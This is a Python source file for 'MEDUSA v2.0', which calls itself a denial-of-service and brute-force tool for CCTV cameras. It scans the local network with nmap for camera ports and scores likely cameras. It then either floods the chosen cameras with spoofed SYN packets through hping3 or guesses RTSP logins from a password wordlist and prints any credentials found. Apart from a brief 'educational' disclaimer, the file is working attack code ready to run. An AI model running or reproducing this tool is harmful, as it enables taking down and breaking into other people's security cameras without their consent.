import subprocess
import time
import json
import os
import sys
import re
import base64
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.align import Align

console = Console(force_terminal=True, soft_wrap=True)

def get_local_network():
    """Automatically detects the local network range."""
    try:
        # Grabs the default route to find the active subnet
        route_output = subprocess.check_output("ip route | grep default", shell=True).decode()
        interface = re.search(r'dev (\w+)', route_output).group(1)
        
        # Gets the specific CIDR range for that interface
        addr_output = subprocess.check_output(f"ip -o -f inet addr show {interface}", shell=True).decode()
        network = re.search(r'inet ([\d\.]+/\d+)', addr_output).group(1)
        
        # Converts specific IP to network address (e.g., 192.168.1.5/24 -> 192.168.1.0/24)
        base_ip = network.split('/')[0].rsplit('.', 1)[0] + ".0/" + network.split('/')[1]
        return base_ip
    except:
        return "192.168.1.0/24" # Fallback if detection fails

# --- AUTO CONFIGURATION ---
TARGET_NETWORK = get_local_network()
CCTV_PORTS = "554,8089,34567,37777,9000,8000,1935,80,8080"
CCTV_KEYWORDS = ["camera", "webcam", "ipcam", "cctv", "v380", "altobeam", "macro-video", "rtsp"]

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
    except:
        return ""

def calculate_confidence(open_ports, banner_info):
    score = 0
    reasons = []
    if "554" in open_ports:
        score += 40
        reasons.append("RTSP detected (554)")
    if "8089" in open_ports:
        score += 35
        reasons.append("V380 port (8089)")
    
    info_lower = banner_info.lower()
    for kw in CCTV_KEYWORDS:
        if kw in info_lower:
            score += 25 
            reasons.append(f"Banner match: '{kw}'")
            break
            
    score = min(score, 100)
    why = ", ".join(reasons)
    status = "CONFIRMED" if score >= 80 else "LIKELY" if score >= 50 else "POSSIBLE"
    color = "bold red" if score >= 80 else "bold yellow" if score >= 50 else "bold cyan"
    return status, color, score, why

def verify_rtsp_deep(ip, user, pw):
    auth_b64 = base64.b64encode(f"{user}:{pw}".encode()).decode()
    payload = f'DESCRIBE rtsp://{ip}/live/ch0 RTSP/1.0\\r\\nCSeq: 1\\r\\nAuthorization: Basic {auth_b64}\\r\\n\\r\\n'
    response = run_cmd(f'echo -e "{payload}" | ncat -w 3 {ip} 554')
    return "RTSP/1.0 200 OK" in response and "m=video" in response

def brute_force(ip):
    u_input = input("[?] User (default 'admin'): ") or "admin"
    p_file = input("[?] Path Password Wordlist: ")
    if not os.path.exists(p_file):
        console.print(f"[red][!] File {p_file} not found![/red]"); return
    with open(p_file, 'r') as f:
        passwords = [l.strip() for l in f.readlines() if l.strip()]

    final_user, final_pass, cracked = "", "", False
    console.print(f"[bold yellow][*] Starting Brute Force on {ip}...[/bold yellow]")
    for p in passwords:
        console.print(f"[dim][*] Testing {u_input}:{p}...[/dim]", end="\r")
        if verify_rtsp_deep(ip, u_input, p):
            final_user, final_pass, cracked = u_input, p, True
            break
        time.sleep(0.05)
    if cracked:
        success_msg = f"[bold green][+] VALID CREDENTIALS FOUND![/bold green]\nTarget: {ip}\nUser: {final_user}\nPass: {final_pass}"
        console.print("\n")
        console.print(Panel(success_msg, title="Scan Verified", border_style="green"))
    else:
        console.print(f"\n[red][-] Brute force finished. No valid credentials found.[/red]")

def get_targets():
    console.print(f"[bold cyan][*] Scanning {TARGET_NETWORK} for CCTV signatures...[/bold cyan]")
    cmd = f"sudo nmap -sV -Pn -p {CCTV_PORTS} --open {TARGET_NETWORK}"
    raw_output = run_cmd(cmd)
    
    targets = []
    if not raw_output: return targets

    hosts = raw_output.split("Nmap scan report for ")
    for host in hosts[1:]:
        lines = host.split('\n')
        ip = lines[0].split()[0]
        open_ports, banners = [], []
        for line in lines:
            if "/tcp" in line and "open" in line:
                parts = line.split()
                p_num = parts[0].split('/')[0]
                b_info = " ".join(parts[4:]) if len(parts) > 4 else "Unknown"
                open_ports.append(p_num)
                banners.append(f"{p_num}:{b_info}")
        
        status, color, conf, why = calculate_confidence(open_ports, " ".join(banners))
        if conf > 0:
            targets.append({"ip": ip, "status": f"[{color}]{status}[/{color}] ({conf}%)", "vuln": "OPEN" if "8089" in open_ports else "CLOSED", "why": why})
    return targets

def release_serpents_dual(ips):
    procs = []
    for ip in ips:
        p1 = subprocess.Popen(["sudo", "hping3", "-S", "-p", "8089", "--flood", "--rand-source", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(["sudo", "hping3", "-S", "-p", "554", "--flood", "--rand-source", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.extend([p1, p2])
    return procs

def main():
    console.print("\n")
    title = Align.center("[bold magenta]M E D U S A   v 2. 0[/bold magenta]", vertical="middle")
    sub_title = "[white]Denial-of-Service & Brute Force Tool for CCTV[/white]"
    disclaimer = (
        "[bold red]LEGAL DISCLAIMER:[/bold red]\n"
        "[dim]This tool is created strictly for educational purposes and authorized\n"
        "security auditing. The creator is NOT responsible for any misuse,\n"
        "illegal activities, or criminality. Testing on unauthorized networks\n"
        "is strictly prohibited and may be subject to legal prosecution.[/dim]\n"
        "────────────────────────────────────────────────────────────\n"
        "[bold green]TIP:[/bold green] [dim]Ensure you are testing on your OWN network and equipment.[/dim]"
    )
    
    console.print(Panel(title, border_style="magenta", padding=(1, 10)))
    console.print(Panel(f"{sub_title}\n\n{disclaimer}", border_style="blue", title="[bold white]Warning Notice[/bold white]"))
    
    targets = get_targets()
    if not targets:
        console.print("[red][!] No targets found.[/red]"); return

    table = Table(title="Scan Results", header_style="bold magenta")
    table.add_column("ID", justify="center")
    table.add_column("IP Address", style="cyan")
    table.add_column("Confidence")
    table.add_column("Petrify (8089/554)", style="red")
    table.add_column("Why (Reasoning)", style="dim green")

    for i, t in enumerate(targets):
        table.add_row(str(i+1), t['ip'], t['status'], t['vuln'], t['why'])
    
    console.print(table)
    console.print("\n[bold yellow][1] Petrify (Dual-DoS) | [2] Brute Force (Port 554) | [Q] Quit[/bold yellow]")
    
    mode = input("\n[?] Select Mode: ").strip().upper()
    if mode == '1':
        idx_input = input("[?] Target ID (or 'A'): ").strip().upper()
        selected = [t['ip'] for t in targets] if idx_input == 'A' else [targets[int(idx_input)-1]['ip']]
        try:
            while True:
                procs = release_serpents_dual(selected)
                console.print(f"[bold red][!] Petrifying... (Ctrl+C to stop)[/bold red]")
                time.sleep(60)
                for p in procs: p.terminate()
                subprocess.run(["sudo", "pkill", "hping3"], capture_output=True)
                time.sleep(30)
        except KeyboardInterrupt: pass
    elif mode == '2':
        idx = int(input("[?] Select Target ID: ")) - 1
        brute_force(targets[idx]['ip'])

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        subprocess.run(["sudo", "pkill", "hping3"], capture_output=True)
        console.print("\n[green][+] The Serpents have retreated.[/green]")
